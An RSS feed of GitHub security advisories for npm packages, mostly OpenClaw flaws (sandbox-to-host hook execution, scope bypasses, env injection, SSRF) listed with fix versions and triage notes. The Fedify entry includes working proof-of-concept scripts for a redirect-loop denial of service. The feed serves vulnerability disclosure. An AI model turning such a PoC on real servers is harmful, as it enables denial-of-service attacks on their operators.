<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-04-07T18:11:33.203Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: OpenShell `mirror` mode can convert untrusted sandbox files into explicitly enabled workspace hooks and execute them on the host during gateway startup]]></title>
        <id>https://github.com/advisories/GHSA-42mx-vp8m-j7qh</id>
        <link href="https://github.com/advisories/GHSA-42mx-vp8m-j7qh"/>
        <updated>2026-04-07T18:11:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>OpenShell <code>mirror</code> mode can convert untrusted sandbox files into explicitly enabled workspace hooks and execute them on the host during gateway startup</p>
<h2 id="current-maintainer-triage">Current Maintainer Triage</h2>
<ul>
<li>Status: narrow</li>
<li>Normalized severity: medium</li>
<li>Assessment: Real on shipped &lt;=2026.3.22 OpenShell mirror sync, but exploit needs mirror mode plus hooks enabled plus explicit hook opt-in plus restart, so high is overstated even though the direct fix shipped in v2026.3.28.</li>
</ul>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Latest published npm version: <code>2026.3.31</code></li>
<li>Vulnerable version range: <code>&lt;=2026.3.24</code></li>
<li>Patched versions: <code>&gt;= 2026.3.28</code></li>
<li>First stable tag containing the fix: <code>v2026.3.28</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>c02ee8a3a4cb390b23afdf21317aa8b2096854d1</code> — 2026-03-25T19:59:07Z</li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<ul>
<li>The fix is already present in released version <code>2026.3.28</code>.</li>
<li>This draft looks ready for final maintainer disposition or publication, not additional code-fix work.</li>
</ul>
<p>Thanks @tdjackey for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-42mx-vp8m-j7qh">https://github.com/openclaw/openclaw/security/advisories/GHSA-42mx-vp8m-j7qh</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/c02ee8a3a4cb390b23afdf21317aa8b2096854d1">https://github.com/openclaw/openclaw/commit/c02ee8a3a4cb390b23afdf21317aa8b2096854d1</a></li>
<li><a href="https://github.com/advisories/GHSA-42mx-vp8m-j7qh">https://github.com/advisories/GHSA-42mx-vp8m-j7qh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-42mx-vp8m-j7qh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-07T18:11:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Gateway operator.write Can Reach Admin-Class Telegram Config and Cron Persistence via send]]></title>
        <id>https://github.com/advisories/GHSA-767m-xrhc-fxm7</id>
        <link href="https://github.com/advisories/GHSA-767m-xrhc-fxm7"/>
        <updated>2026-04-07T18:11:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Gateway operator.write Can Reach Admin-Class Telegram Config and Cron Persistence via send</p>
<h2 id="current-maintainer-triage">Current Maintainer Triage</h2>
<ul>
<li>Status: narrow</li>
<li>Normalized severity: medium</li>
<li>Assessment: Real shipped operator.write to admin-class Telegram config or cron persistence bug, but it is an authenticated sink-specific escalation and high is too high given the narrower scope.</li>
</ul>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Latest published npm version: <code>2026.3.31</code></li>
<li>Vulnerable version range: <code>&lt;=2026.3.24</code></li>
<li>Patched versions: <code>&gt;= 2026.3.28</code></li>
<li>First stable tag containing the fix: <code>v2026.3.28</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>b7d70ade3b9900dbe97bd73be9c02e924ff3c986</code> — 2026-03-25T12:12:09-06:00</li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<ul>
<li>The fix is already present in released version <code>2026.3.28</code>.</li>
<li>This draft looks ready for final maintainer disposition or publication, not additional code-fix work.</li>
</ul>
<p>Thanks @zpbrent for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-767m-xrhc-fxm7">https://github.com/openclaw/openclaw/security/advisories/GHSA-767m-xrhc-fxm7</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/b7d70ade3b9900dbe97bd73be9c02e924ff3c986">https://github.com/openclaw/openclaw/commit/b7d70ade3b9900dbe97bd73be9c02e924ff3c986</a></li>
<li><a href="https://github.com/advisories/GHSA-767m-xrhc-fxm7">https://github.com/advisories/GHSA-767m-xrhc-fxm7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-767m-xrhc-fxm7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-07T18:11:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: `session_status` still bypasses configured `tools.sessions.visibility` for unsandboxed invocations ]]></title>
        <id>https://github.com/advisories/GHSA-fwjq-xwfj-gv75</id>
        <link href="https://github.com/advisories/GHSA-fwjq-xwfj-gv75"/>
        <updated>2026-04-07T18:11:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>session_status</code> still bypasses configured <code>tools.sessions.visibility</code> for unsandboxed invocations</p>
<h2 id="current-maintainer-triage">Current Maintainer Triage</h2>
<ul>
<li>Status: narrow</li>
<li>Normalized severity: medium</li>
<li>Assessment: Real on shipped v2026.3.22: non-sandboxed session_status skipped the shared visibility guard, but this is a same-agent session-policy bypass with unreleased fix, not a broader host-boundary break.</li>
</ul>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Latest published npm version: <code>2026.3.31</code></li>
<li>Vulnerable version range: <code>&lt;=2026.3.28</code></li>
<li>Patched versions: <code>&gt;= 2026.3.31</code></li>
<li>First stable tag containing the fix: <code>v2026.3.31</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>4d369a3400dc9b737fbe8daa63f09d909ce7beb8</code> — 2026-03-30T16:48:12+02:00</li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<ul>
<li>The fix is already present in released version <code>2026.3.31</code>.</li>
<li>This draft looks ready for final maintainer disposition or publication, not additional code-fix work.</li>
</ul>
<p>Thanks @tdjackey for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-fwjq-xwfj-gv75">https://github.com/openclaw/openclaw/security/advisories/GHSA-fwjq-xwfj-gv75</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/4d369a3400dc9b737fbe8daa63f09d909ce7beb8">https://github.com/openclaw/openclaw/commit/4d369a3400dc9b737fbe8daa63f09d909ce7beb8</a></li>
<li><a href="https://github.com/advisories/GHSA-fwjq-xwfj-gv75">https://github.com/advisories/GHSA-fwjq-xwfj-gv75</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fwjq-xwfj-gv75</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-07T18:11:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Gateway operator.write Can Reach Admin-Class Talk Voice Config Persistence via chat.send]]></title>
        <id>https://github.com/advisories/GHSA-3q42-xmxv-9vfr</id>
        <link href="https://github.com/advisories/GHSA-3q42-xmxv-9vfr"/>
        <updated>2026-04-07T18:11:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Gateway operator.write Can Reach Admin-Class Talk Voice Config Persistence via chat.send</p>
<h2 id="current-maintainer-triage">Current Maintainer Triage</h2>
<ul>
<li>Status: narrow</li>
<li>Normalized severity: medium</li>
<li>Assessment: Real shipped operator.write to admin-class Talk Voice config persistence bug, but it is the same narrow authenticated persistence class and should be normalized below high.</li>
</ul>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Latest published npm version: <code>2026.3.31</code></li>
<li>Vulnerable version range: <code>&lt;=2026.3.24</code></li>
<li>Patched versions: <code>&gt;= 2026.3.28</code></li>
<li>First stable tag containing the fix: <code>v2026.3.28</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>e34694733fc64931ed4a543c73d84ad3435d5df1</code> — 2026-03-25T19:55:26Z</li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<ul>
<li>The fix is already present in released version <code>2026.3.28</code>.</li>
<li>This draft looks ready for final maintainer disposition or publication, not additional code-fix work.</li>
</ul>
<p>Thanks @zpbrent for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-3q42-xmxv-9vfr">https://github.com/openclaw/openclaw/security/advisories/GHSA-3q42-xmxv-9vfr</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/e34694733fc64931ed4a543c73d84ad3435d5df1">https://github.com/openclaw/openclaw/commit/e34694733fc64931ed4a543c73d84ad3435d5df1</a></li>
<li><a href="https://github.com/advisories/GHSA-3q42-xmxv-9vfr">https://github.com/advisories/GHSA-3q42-xmxv-9vfr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3q42-xmxv-9vfr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-07T18:11:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw Has Incomplete Fix for CVE-2026-4039: CLI Backend Environment Variable Injection via Workspace Config]]></title>
        <id>https://github.com/advisories/GHSA-vfw7-6rhc-6xxg</id>
        <link href="https://github.com/advisories/GHSA-vfw7-6rhc-6xxg"/>
        <updated>2026-04-07T18:10:53.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Incomplete Fix for CVE-2026-4039: CLI Backend Environment Variable Injection via Workspace Config</p>
<h2 id="current-maintainer-triage">Current Maintainer Triage</h2>
<ul>
<li>Status: open</li>
<li>Normalized severity: high</li>
<li>Assessment: Real shipped malicious-workspace-config env injection in the CLI backend runner, fixed by sanitizing backend env before spawn and shipped in v2026.3.24, so advisory stays open until published.</li>
</ul>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Latest published npm version: <code>2026.3.31</code></li>
<li>Vulnerable version range: <code>&lt;=2026.3.23-2</code></li>
<li>Patched versions: <code>&gt;= 2026.3.24</code></li>
<li>First stable tag containing the fix: <code>v2026.3.24</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>c2fb7f1948c3226732a630256b5179a60664ec24</code> — 2026-03-24T12:58:10-07:00</li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<ul>
<li>The fix is already present in released version <code>2026.3.24</code>.</li>
<li>This draft looks ready for final maintainer disposition or publication, not additional code-fix work.</li>
</ul>
<p>Thanks @YLChen-007 for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-vfw7-6rhc-6xxg">https://github.com/openclaw/openclaw/security/advisories/GHSA-vfw7-6rhc-6xxg</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/c2fb7f1948c3226732a630256b5179a60664ec24">https://github.com/openclaw/openclaw/commit/c2fb7f1948c3226732a630256b5179a60664ec24</a></li>
<li><a href="https://github.com/advisories/GHSA-vfw7-6rhc-6xxg">https://github.com/advisories/GHSA-vfw7-6rhc-6xxg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vfw7-6rhc-6xxg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T18:10:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Marketplace Plugin Download Follows Redirects Without SSRF Protection]]></title>
        <id>https://github.com/advisories/GHSA-vjx8-8p7h-82gr</id>
        <link href="https://github.com/advisories/GHSA-vjx8-8p7h-82gr"/>
        <updated>2026-04-07T18:10:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Marketplace Plugin Download Follows Redirects Without SSRF Protection</p>
<h2 id="current-maintainer-triage">Current Maintainer Triage</h2>
<ul>
<li>Status: open</li>
<li>Normalized severity: medium</li>
<li>Assessment: v2026.3.28 still uses bare redirect-following fetch in src/plugins/marketplace.ts for marketplace archives, and fixed-on-main only does not change that shipped SSRF exposure.</li>
</ul>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Latest published npm version: <code>2026.3.31</code></li>
<li>Vulnerable version range: <code>&lt;=2026.3.28</code></li>
<li>Patched versions: <code>&gt;= 2026.3.31</code></li>
<li>First stable tag containing the fix: <code>v2026.3.31</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>2ce44ca6a1302b166a128abbd78f72114f2f4f52</code> — 2026-03-31T12:59:42+01:00</li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<ul>
<li>The fix is already present in released version <code>2026.3.31</code>.</li>
<li>This draft looks ready for final maintainer disposition or publication, not additional code-fix work.</li>
</ul>
<p>Thanks @AntAISecurityLab for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-vjx8-8p7h-82gr">https://github.com/openclaw/openclaw/security/advisories/GHSA-vjx8-8p7h-82gr</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/2ce44ca6a1302b166a128abbd78f72114f2f4f52">https://github.com/openclaw/openclaw/commit/2ce44ca6a1302b166a128abbd78f72114f2f4f52</a></li>
<li><a href="https://github.com/advisories/GHSA-vjx8-8p7h-82gr">https://github.com/advisories/GHSA-vjx8-8p7h-82gr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjx8-8p7h-82gr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-07T18:10:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Tlon media downloads can bypass core safety limits and exhaust disk]]></title>
        <id>https://github.com/advisories/GHSA-4g5x-2jfc-xm98</id>
        <link href="https://github.com/advisories/GHSA-4g5x-2jfc-xm98"/>
        <updated>2026-04-07T18:10:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Tlon media downloads can bypass core safety limits and exhaust disk</p>
<h2 id="current-maintainer-triage">Current Maintainer Triage</h2>
<ul>
<li>Status: narrow</li>
<li>Normalized severity: low</li>
<li>Assessment: Shipped v2026.3.28 Tlon media downloads bypassed core size/count/cleanup limits, but this is availability-only resource exhaustion in a bundled plugin path, so low.</li>
</ul>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Latest published npm version: <code>2026.3.31</code></li>
<li>Vulnerable version range: <code>&lt;=2026.3.28</code></li>
<li>Patched versions: <code>&gt;= 2026.3.31</code></li>
<li>First stable tag containing the fix: <code>v2026.3.31</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>2194587d70d2aef863508b945319c5a7c88b12ce</code> — 2026-03-31T19:40:15+09:00</li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<ul>
<li>The fix is already present in released version <code>2026.3.31</code>.</li>
<li>This draft looks ready for final maintainer disposition or publication, not additional code-fix work.</li>
</ul>
<p>Thanks @AntAISecurityLab for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-4g5x-2jfc-xm98">https://github.com/openclaw/openclaw/security/advisories/GHSA-4g5x-2jfc-xm98</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/2194587d70d2aef863508b945319c5a7c88b12ce">https://github.com/openclaw/openclaw/commit/2194587d70d2aef863508b945319c5a7c88b12ce</a></li>
<li><a href="https://github.com/advisories/GHSA-4g5x-2jfc-xm98">https://github.com/advisories/GHSA-4g5x-2jfc-xm98</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4g5x-2jfc-xm98</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-07T18:10:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenClaw] Duplicate Advisory: OpenClaw: Unavailable local auth SecretRefs could fall through to remote credentials in local mode]]></title>
        <id>https://github.com/advisories/GHSA-vm29-7mq3-9jrg</id>
        <link href="https://github.com/advisories/GHSA-vm29-7mq3-9jrg"/>
        <updated>2026-04-07T18:10:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-qvr7-g57c-mrc7. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.3.11 contains a credential fallback vulnerability where unavailable local gateway.auth.token and gateway.auth.password SecretRefs are treated as unset, allowing fallback to remote credentials in local mode. Attackers can exploit misconfigured local auth references to cause CLI and helper paths to select incorrect credential sources, potentially bypassing intended local authentication boundaries.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-qvr7-g57c-mrc7">https://github.com/openclaw/openclaw/security/advisories/GHSA-qvr7-g57c-mrc7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32970">https://nvd.nist.gov/vuln/detail/CVE-2026-32970</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-credential-fallback-logic-bypass-via-unavailable-local-auth-secretrefs">https://www.vulncheck.com/advisories/openclaw-credential-fallback-logic-bypass-via-unavailable-local-auth-secretrefs</a></li>
<li><a href="https://github.com/advisories/GHSA-vm29-7mq3-9jrg">https://github.com/advisories/GHSA-vm29-7mq3-9jrg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm29-7mq3-9jrg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-31T12:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: `/phone arm`/`/phone disarm` Bypasses `operator.admin` Scope Check for External Channels ]]></title>
        <id>https://github.com/advisories/GHSA-h2v7-xc88-xx8c</id>
        <link href="https://github.com/advisories/GHSA-h2v7-xc88-xx8c"/>
        <updated>2026-04-07T18:10:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>/phone arm</code>/<code>/phone disarm</code> Bypasses <code>operator.admin</code> Scope Check for External Channels</p>
<h2 id="current-maintainer-triage">Current Maintainer Triage</h2>
<ul>
<li>Status: open</li>
<li>Normalized severity: medium</li>
<li>Assessment: Maintainers accepted this issue, fixed it in aa66ae1fc797d3298cc409ed2c5da69a89950a45 on 2026-03-27, and that fix shipped in v2026.3.28, so normalize it as a fixed released draft rather than a close-by-trust-model call.</li>
</ul>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Latest published npm version: <code>2026.3.31</code></li>
<li>Vulnerable version range: <code>&lt;=2026.3.24</code></li>
<li>Patched versions: <code>&gt;= 2026.3.28</code></li>
<li>First stable tag containing the fix: <code>v2026.3.28</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>aa66ae1fc797d3298cc409ed2c5da69a89950a45</code> — 2026-03-27T20:35:42Z</li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<ul>
<li>The fix is already present in released version <code>2026.3.28</code>.</li>
<li>This draft looks ready for final maintainer disposition or publication, not additional code-fix work.</li>
</ul>
<p>Thanks @AntAISecurityLab for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-h2v7-xc88-xx8c">https://github.com/openclaw/openclaw/security/advisories/GHSA-h2v7-xc88-xx8c</a></li>
<li><a href="https://github.com/advisories/GHSA-h2v7-xc88-xx8c">https://github.com/advisories/GHSA-h2v7-xc88-xx8c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h2v7-xc88-xx8c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-07T18:10:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw has Bypass in Webhook Rate Limiting via Pre-Authentication Secret Validation]]></title>
        <id>https://github.com/advisories/GHSA-8288-jpqp-95fx</id>
        <link href="https://github.com/advisories/GHSA-8288-jpqp-95fx"/>
        <updated>2026-04-07T18:04:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because CVE-2026-34508 has been rejected as a duplicate of CVE-2026-34505. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.3.12 applies rate limiting only after webhook authentication succeeds, allowing attackers to bypass rate limits and brute-force webhook secrets without triggering 429 responses. Attackers can repeatedly guess invalid secrets to discover valid credentials and subsequently submit forged Zalo webhook traffic.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-5m9r-p9g7-679c">https://github.com/openclaw/openclaw/security/advisories/GHSA-5m9r-p9g7-679c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34508">https://nvd.nist.gov/vuln/detail/CVE-2026-34508</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-webhook-rate-limiting-bypass-via-pre-authentication-secret-validation-2">https://www.vulncheck.com/advisories/openclaw-webhook-rate-limiting-bypass-via-pre-authentication-secret-validation-2</a></li>
<li><a href="https://github.com/advisories/GHSA-8288-jpqp-95fx">https://github.com/advisories/GHSA-8288-jpqp-95fx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8288-jpqp-95fx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-31T12:31:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Fedify affected by resource exhaustion caused by unbounded redirect following during remote key/document resolution]]></title>
        <id>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</id>
        <link href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp"/>
        <updated>2026-04-07T18:04:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@fedify/fedify</code> follows HTTP redirects recursively in its remote document loader and authenticated document loader without enforcing a maximum redirect count or visited-URL loop detection. An attacker who controls a remote ActivityPub key or actor URL can force a server using Fedify to make repeated outbound requests from a single inbound request, leading to resource consumption and denial of service.</p>
<h3 id="details">Details</h3>
<p>Fedify verifies ActivityPub HTTP signatures by fetching the remote <code>keyId</code> during request processing. The relevant flow is <code>handleInboxInternal()</code> -&gt; <code>verifyRequest()</code> -&gt; <code>fetchKeyInternal()</code> -&gt; document loader.</p>
<p>In affected versions:</p>
<ul>
<li>the generic document loader recursively follows <code>3xx</code> responses by calling <code>load()</code> again on the <code>Location</code> header</li>
<li>the authenticated redirect path (<code>doubleKnock()</code>) also recursively follows redirects</li>
<li>neither path enforces a redirect cap or tracks visited URLs to detect self-referential redirect loops</li>
</ul>
<p>As a result, if an attacker-controlled <code>keyId</code> or actor URL responds with <code>302 Location: &lt;same URL&gt;</code>, a single ActivityPub request can trigger tens or hundreds of outbound requests before the fetch completes or the request times out.</p>
<p>I confirmed the issue in <code>@fedify/fedify</code> 1.9.1 and 1.9.2. By contrast, Fedify's WebFinger lookup path already has a redirect cap, which suggests the missing bound in the document loader is unintended.</p>
<p>Failed key fetches are not durably negatively cached. After a failed lookup, the null result is only remembered in a request-local cache, so later requests can trigger the same redirect loop again for the same <code>keyId</code>.</p>
<h3 id="poc">PoC</h3>
<p>Minimal direct reproduction with the package:</p>
<ol>
<li>Install <code>@fedify/fedify@1.9.2</code>.</li>
<li>Save and run the following script:</li>
</ol>
<pre><code class="language-js">import http from "node:http";
import { getDocumentLoader } from "@fedify/fedify";

const port = 45679;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const loader = getDocumentLoader({ allowPrivateAddress: true });
  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<ol start="3">
<li>Observe output similar to:</li>
</ol>
<pre><code>{ count: 120 }
</code></pre>
<p>This shows the loader followed 119 self-redirects before the first non-redirect response.</p>
<p>The authenticated loader used for signed requests shows the same behavior:</p>
<pre><code>import http from "node:http";
import {
  generateCryptoKeyPair,
  getAuthenticatedDocumentLoader,
} from "@fedify/fedify";

const port = 45680;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const { privateKey } = await generateCryptoKeyPair();
  const loader = getAuthenticatedDocumentLoader(
    {
      privateKey,
      keyId: new URL("https://example.com/users/index#main-key"),
    },
    { allowPrivateAddress: true },
  );

  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an unauthenticated denial-of-service / request amplification issue. Any Fedify-based server that verifies remote keys or loads remote ActivityPub documents can be forced to spend CPU time, worker time, connection slots, and outbound bandwidth following attacker-controlled redirects. A single inbound request can trigger a large number of outbound requests, and the attack can be repeated across requests because failed lookups are not durably negatively cached.</p>
<h3 id="misc-notes">Misc Notes</h3>
<p>This issue was surfaced by a Ghost ActivityPub user reporting the issue directly to Ghost. The above report was generated upon further investigation into the issue by the Ghost team. <strong>The original reporter should be credited for the discovery</strong>.</p>
<p>In case you accept this advisory please coordinate time of disclosure and credit with us</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34148">https://nvd.nist.gov/vuln/detail/CVE-2026-34148</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.10.5">https://github.com/fedify-dev/fedify/releases/tag/1.10.5</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.9.6">https://github.com/fedify-dev/fedify/releases/tag/1.9.6</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.0.8">https://github.com/fedify-dev/fedify/releases/tag/2.0.8</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.1.1">https://github.com/fedify-dev/fedify/releases/tag/2.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T18:04:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Fedify affected by resource exhaustion caused by unbounded redirect following during remote key/document resolution]]></title>
        <id>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</id>
        <link href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp"/>
        <updated>2026-04-07T18:04:11.000Z</updated>
